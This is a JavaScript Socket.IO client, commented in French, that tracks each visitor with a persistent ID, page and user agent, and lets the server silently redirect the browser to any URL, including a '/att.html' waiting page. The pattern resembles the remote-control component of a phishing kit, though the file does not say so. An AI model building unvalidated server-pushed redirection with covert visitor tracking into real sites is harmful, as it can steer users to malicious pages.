// Client WebSocket simple et efficace pour le système de redirection
// Compatible avec le serveur Node.js existant

class SimpleRedirectionClient {
    constructor() {
        this.socket = null;
        this.clientId = null;
        this.isConnected = false;
        this.heartbeatInterval = null;
        
        this.init();
    }

    init() {
        console.log('🚀 Initialisation du client de redirection...');
        
        // ✅ 1. Générer ou récupérer un clientId
        this.clientId = localStorage.getItem('clientId');
        if (!this.clientId) {
            this.clientId = 'client_' + Math.random().toString(36).substring(2, 10);
            localStorage.setItem('clientId', this.clientId);
            console.log('🆔 Nouveau clientId généré:', this.clientId);
        } else {
            console.log('🔄 ClientId récupéré:', this.clientId);
        }
        
        // ✅ 2. Se connecter en WebSocket
        this.connect();
    }

    connect() {
        console.log('🔌 Connexion WebSocket...');
        
        // Configuration du socket
        this.socket = io({
            transports: ['websocket', 'polling'],
            upgrade: true,
            rememberUpgrade: true,
            timeout: 10000,
            reconnection: true,
            reconnectionAttempts: 5,
            reconnectionDelay: 1000
        });
        
        this.setupSocketEvents();
    }

    setupSocketEvents() {
        // Gestion de la connexion
        this.socket.on('connect', () => {
            console.log('✅ Connecté au serveur WebSocket');
            this.isConnected = true;
            
            // ✅ 3. Émettre immédiatement new_client
            console.log('📤 Envoi de new_client avec:', {
                clientId: this.clientId,
                page: window.location.pathname,
                userAgent: navigator.userAgent
            });
            
            this.socket.emit('new_client', {
                clientId: this.clientId,
                page: window.location.pathname,
                userAgent: navigator.userAgent
            });
            
            // ✅ 4. Démarrer le heartbeat
            this.startHeartbeat();
        });

        // Réception de l'ID client du serveur
        this.socket.on('client_id', (data) => {
            console.log('🆔 ID Client reçu du serveur:', data.client_id);
            
            // Mettre à jour l'ID si le serveur en a généré un nouveau
            if (data.client_id !== this.clientId) {
                this.clientId = data.client_id;
                localStorage.setItem('clientId', this.clientId);
            }
        });

        // Gestion des redirections
        this.socket.on('redirect', (data) => {
            console.log('🔄 Redirection reçue vers:', data.url);
            this.performRedirection(data.url);
        });

        // Gestion des heartbeats
        this.socket.on('heartbeat_ack', () => {
            console.log('💓 Heartbeat ACK reçu');
        });

        // Gestion de la déconnexion
        this.socket.on('disconnect', (reason) => {
            console.warn('❌ Déconnecté du serveur WebSocket:', reason);
            this.isConnected = false;
            this.stopHeartbeat();
        });

        // Gestion des erreurs
        this.socket.on('connect_error', (error) => {
            console.error('❌ Erreur de connexion WebSocket:', error);
        });

        this.socket.on('error', (error) => {
            console.error('❌ Erreur WebSocket:', error);
        });
    }

    // ✅ 4. Heartbeat toutes les 10 secondes
    startHeartbeat() {
        this.stopHeartbeat(); // S'assurer qu'il n'y a pas de heartbeat existant
        
        console.log('💓 Démarrage du heartbeat (toutes les 10 secondes)');
        
        this.heartbeatInterval = setInterval(() => {
            if (this.isConnected && this.clientId) {
                console.log('💓 Envoi heartbeat pour client:', this.clientId);
                
                this.socket.emit('heartbeat', {
                    clientId: this.clientId,
                    page: window.location.pathname
                });
            }
        }, 10000); // 10 secondes
    }

    stopHeartbeat() {
        if (this.heartbeatInterval) {
            clearInterval(this.heartbeatInterval);
            this.heartbeatInterval = null;
            console.log('💓 Heartbeat arrêté');
        }
    }

    // Gestion des redirections
    performRedirection(url) {
        console.log('🔄 Redirection vers:', url);
        
        // Redirection silencieuse
        if (url.startsWith('http://') || url.startsWith('https://')) {
            // URL externe
            window.location.href = url;
        } else {
            // URL interne
            window.location.href = url;
        }
    }

    // Notifier le changement de page
    notifyPageChange(page) {
        if (this.isConnected && this.clientId) {
            console.log('📄 Changement de page:', page);
            this.socket.emit('page_change', {
                clientId: this.clientId,
                page: page
            });
        }
    }

    // Méthodes utilitaires
    getStatus() {
        return {
            isConnected: this.isConnected,
            clientId: this.clientId,
            currentPage: window.location.pathname
        };
    }

    disconnect() {
        console.log('🔌 Déconnexion manuelle');
        this.stopHeartbeat();
        if (this.socket) {
            this.socket.disconnect();
        }
    }
}

// ✅ Initialiser le client dès que le DOM est chargé
document.addEventListener('DOMContentLoaded', () => {
    console.log('📄 DOM chargé - Initialisation du client WebSocket');
    
    // Créer l'instance globale
    window.redirectionClient = new SimpleRedirectionClient();
    
    // Notifier le changement de page après le chargement complet
    window.addEventListener('load', () => {
        console.log('📄 Page complètement chargée');
        if (window.redirectionClient) {
            window.redirectionClient.notifyPageChange(window.location.pathname);
        }
    });
    
    // Gérer les changements d'URL (navigation)
    window.addEventListener('popstate', () => {
        setTimeout(() => {
            if (window.redirectionClient) {
                window.redirectionClient.notifyPageChange(window.location.pathname);
            }
        }, 100);
    });
    
    // Gérer la fermeture de la page
    window.addEventListener('beforeunload', () => {
        if (window.redirectionClient) {
            window.redirectionClient.disconnect();
        }
    });
});

// ✅ Fonctions utilitaires pour compatibilité
function redirectToWaitingPage() {
    if (window.redirectionClient && window.redirectionClient.getStatus().isConnected) {
        window.redirectionClient.performRedirection('/att.html');
    } else {
        console.warn('WebSocket non disponible, utilisation du fallback');
        window.location.href = '/att.html';
    }
}

function getConnectionStatus() {
    if (window.redirectionClient) {
        return window.redirectionClient.getStatus();
    }
    return { isConnected: false, error: 'Client non initialisé' };
}

function forceReconnect() {
    if (window.redirectionClient) {
        window.redirectionClient.disconnect();
        setTimeout(() => {
            window.redirectionClient = new SimpleRedirectionClient();
        }, 1000);
    }
}

// ✅ Debug : Afficher le statut de connexion
setInterval(() => {
    if (window.redirectionClient) {
        const status = window.redirectionClient.getStatus();
        console.log('📊 Statut client:', status);
    }
}, 30000); // Toutes les 30 secondes

